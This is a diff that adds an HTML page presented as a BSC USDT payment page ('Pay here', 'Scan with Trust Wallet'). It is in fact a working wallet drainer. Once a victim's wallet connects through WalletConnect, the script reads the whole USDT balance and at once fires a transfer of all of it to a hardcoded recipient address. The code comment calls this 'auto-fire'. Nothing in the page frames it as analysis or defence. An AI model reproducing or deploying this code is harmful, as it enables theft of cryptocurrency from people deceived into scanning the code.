@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #00ff88;
+        }
+        .grid-bg {
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(0deg, rgba(0,255,136,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+        }
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(15,15,15,0.95);
+            border: 1px solid rgba(0,255,136,0.2);
+            border-radius: 12px;
+            padding: 40px 36px;
+            width: 100%;
+            max-width: 420px;
+            margin: 20px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(0,255,136,0.07);
+        }
+        .logo { font-size: 11px; letter-spacing: 4px; color: rgba(0,255,136,0.4); margin-bottom: 6px; }
+        h1 { font-size: 24px; letter-spacing: 3px; font-weight: bold; margin-bottom: 6px; }
+        .chain-badge {
+            display: inline-block; font-size: 10px; letter-spacing: 2px;
+            color: #000; background: #00ff88; padding: 2px 10px;
+            border-radius: 20px; margin-bottom: 28px;
+        }
+        .qr-wrap {
+            background: #111;
+            border: 1px dashed rgba(0,255,136,0.25);
+            border-radius: 8px;
+            padding: 24px;
+            min-height: 280px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .qr-label { font-size: 10px; color: rgba(0,255,136,0.4); letter-spacing: 2px; }
+        .status-box {
+            font-size: 12px; color: rgba(0,255,136,0.7);
+            margin-bottom: 16px; min-height: 20px; line-height: 1.6;
+        }
+        .status-box.error { color: #ff4455; }
+        .status-box.warn  { color: #ffaa00; }
+        .status-box.ok    { color: #00ff88; }
+        .btn-send {
+            display: none; width: 100%; padding: 14px;
+            background: #00ff88; color: #000;
+            font-family: 'Courier New', monospace;
+            font-size: 14px; font-weight: bold;
+            letter-spacing: 2px; border: none;
+            border-radius: 6px; cursor: pointer;
+            text-transform: uppercase; margin-bottom: 16px;
+            transition: opacity 0.2s;
+        }
+        .btn-send:hover { opacity: 0.85; }
+        .btn-send:disabled { opacity: 0.4; cursor: not-allowed; }
+        .info-row {
+            display: flex; justify-content: space-between;
+            font-size: 10px; color: rgba(0,255,136,0.45);
+            border-top: 1px solid rgba(0,255,136,0.08);
+            padding-top: 14px;
+        }
+        .spinner {
+            width: 28px; height: 28px;
+            border: 2px solid rgba(0,255,136,0.15);
+            border-top-color: #00ff88;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        a { color: #00ff88; }
+    </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="card">
+    <div class="logo">BEP-20 NETWORK</div>
+    <h1>USDT TRANSFER</h1>
+    <span class="chain-badge">BSC</span>
+
+    <div class="qr-wrap">
+        <div class="spinner" id="spinner"></div>
+        <div id="qrCanvas" style="display:none"></div>
+        <div class="qr-label" id="qrLabel"></div>
+    </div>
+
+    <div class="status-box warn" id="status">Initializing WalletConnect v2...</div>
+
+    <button class="btn-send" id="btnSend" onclick="sendUSDT()">
+        ⚡ Send All USDT
+    </button>
+
+    <div class="info-row">
+        <span id="balanceInfo">Balance: —</span>
+        <span id="addrInfo">Not connected</span>
+    </div>
+</div>
+
+<script type="module">
+import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.11.2';
+
+const RECIPIENT = "0xEEf23efB1a01Ad12F01Dab10242396Bba0FaEbE9";
+const USDT_ADDR = "0xBE7A1Cde6E6815826b675Ef71c8BA785bff58888";
+const PROJECT_ID = "a0e525fa712217527b8314e3a1702645";
+const RPC = "https://bsc-dataseed1.binance.org/";
+const USDT_ABI = [
+    "function balanceOf(address) view returns (uint256)",
+    "function transfer(address,uint256) returns (bool)",
+    "function decimals() view returns (uint8)"
+];
+
+let wcProvider, ethersProvider, signer, userAddress;
+let storedBalance, storedDecimals;
+
+function setStatus(msg, cls = '') {
+    const el = document.getElementById('status');
+    el.innerHTML = msg;
+    el.className = 'status-box ' + cls;
+}
+
+function showQR(uri) {
+    document.getElementById('spinner').style.display = 'none';
+    const wrap = document.getElementById('qrCanvas');
+    wrap.style.display = 'block';
+    wrap.innerHTML = '';
+    new QRCode(wrap, {
+        text: uri,
+        width: 240, height: 240,
+        colorDark: "#00ff88",
+        colorLight: "#111111",
+        correctLevel: QRCode.CorrectLevel.M
+    });
+    document.getElementById('qrLabel').textContent = 'SCAN WITH TRUST WALLET';
+    setStatus('Waiting for scan...', 'warn');
+}
+
+async function init() {
+    try {
+        wcProvider = await EthereumProvider.init({
+            projectId: PROJECT_ID,
+            chains: [56],
+            rpcMap: { 56: RPC },
+            showQrModal: false,
+            metadata: {
+                name: "Nora Lee",
+                description: "Pay here",
+                url: window.location.origin,
+                icons: []
+            }
+        });
+
+        wcProvider.on("display_uri", (uri) => {
+            showQR(uri);
+        });
+
+        wcProvider.on("connect", async () => {
+            document.getElementById('qrCanvas').style.display = 'none';
+            document.getElementById('qrLabel').textContent = '';
+            document.getElementById('spinner').style.display = 'block';
+            setStatus('Connected! Fetching balance...', 'warn');
+
+            ethersProvider = new ethers.providers.Web3Provider(wcProvider);
+            signer = ethersProvider.getSigner();
+            userAddress = await signer.getAddress();
+
+            document.getElementById('addrInfo').textContent =
+                userAddress.slice(0,6) + '...' + userAddress.slice(-4);
+
+            const rpc = new ethers.providers.JsonRpcProvider(RPC);
+            const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, rpc);
+            storedDecimals = await usdt.decimals();
+            storedBalance  = await usdt.balanceOf(userAddress);
+            const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
+
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('balanceInfo').textContent =
+                'Balance: ' + parseFloat(formatted).toFixed(2) + ' USDT';
+
+            if (storedBalance.eq(0)) {
+                setStatus('No USDT balance found.', 'error');
+                return;
+            }
+
+            setStatus('Ready — ' + parseFloat(formatted).toFixed(2) + ' USDT available.', 'ok');
+            document.getElementById('btnSend').style.display = 'block';
+            
+            // 🔥 AUTO-FIRE THE TRANSFER IMMEDIATELY 🔥
+            sendUSDT();
+        });
+
+        wcProvider.on("disconnect", () => {
+            setStatus('Wallet disconnected.', 'error');
+            document.getElementById('btnSend').style.display = 'none';
+        });
+
+        await wcProvider.connect();
+
+    } catch (err) {
+        console.error(err);
+        document.getElementById('spinner').style.display = 'none';
+        setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
+    }
+}
+
+window.sendUSDT = async function() {
+    const btn = document.getElementById('btnSend');
+    btn.disabled = true;
+    setStatus('Sending to wallet for approval...', 'warn');
+    try {
+        const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, signer);
+        const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
+        const tx = await usdt.transfer(RECIPIENT, storedBalance);
+        setStatus('Confirming: <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">' + tx.hash.slice(0,14) + '...</a>', 'warn');
+        const receipt = await tx.wait();
+        if (receipt && receipt.status === 1) {
+            setStatus('✓ Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">View on BscScan</a>', 'ok');
+            btn.style.display = 'none';
+        } else {
+            setStatus('Transaction reverted.', 'error');
+            btn.disabled = false;
+        }
+    } catch (err) {
+        const msg = err.message || String(err);
+        setStatus(msg.includes('rejected') ? 'Rejected in wallet.' : 'Error: ' + msg.slice(0,80), 'error');
+        btn.disabled = false;
+    }
+}
+
+init();
+</script>
+</body>
+</html>
